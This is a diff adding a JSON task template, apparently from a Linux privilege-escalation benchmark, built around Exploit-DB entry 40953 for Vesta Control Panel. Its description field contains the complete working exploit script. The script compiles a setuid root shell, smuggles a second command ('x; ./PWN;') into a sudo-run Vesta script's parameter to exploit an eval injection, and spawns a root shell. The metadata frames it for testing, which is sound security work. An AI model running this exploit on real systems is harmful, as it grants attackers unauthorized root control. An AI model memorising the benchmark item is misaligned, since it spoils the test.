@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40953",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Vesta Control Panel 0.9.8-16 - Local Privilege Escalation\n\nExploit source code (40953.sh):\n```\n#!/bin/bash\n#\n# Exploit Title: Vesta Control Panel 0.9.7 <= 0.9.8-16 Local Privilege Escalation Exploit\n# Google Dork: vesta control panel inurl:8083\n# Exploit Author: Jaka Hudoklin @offlinehacker\n# Vendor Homepage: http://vestacp.com/\n# Software Link: https://github.com/serghey-rodin/vesta\n# Version: 0.9.7 - 0.9.8-16\n#\n# Description:\n# Vesta CP default install script adds /usr/local/vesta/bin/ directory into\n# /etc/sudoers.d with the NOPASSWD option for the default \"admin\" user. All\n# programs in /usr/local/vesta/bin/ directory can therefore be run as root. A\n# command injection vulnerability in \"v-get-web-domain-value\" script can be\n# exploited to run arbitrary commands and escalate from admin user to root.\n#\n# Vulnerability:\n# Parameter $3 (key) in v-get-web-domain-value is not properly sanitized before\n# being passed to bash eval.\n#\n#\n\n# Navigate to a writeable directory, usually /tmp.\ncd /tmp\n\n# Write a simple C suid shell to suid.c.\ncat > suid.c << _EOF\nint main(void) {\n       setgid(0); setuid(0);\n       execl(\"/bin/sh\",\"sh\",0); }\n_EOF\n\n# Compile suid shell with gcc.\n# [!] If there is no gcc on the system deploy a precompiled binary manually.\ngcc suid.c -o suid\n\n# Create a shell script called PWN that will be run as root.\n# PWN will weaponize ./suid with executable permissions and suid bit.\necho \"chown root:root suid; chmod 777 suid; chmod +s suid;\" > PWN\n\n# Make PWN shell script executable.\nchmod +x PWN\n\n# Inject command to run PWN into v-get-web-domain-value parameter $3.\nsudo /usr/local/vesta/bin/v-get-web-domain-value 'admin' 'domain.com' 'x; ./PWN;'\n\n# Spawn the root shell.\n./suid\n```",
+  "cve": "",
+  "exploitdb_id": "40953",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40953",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
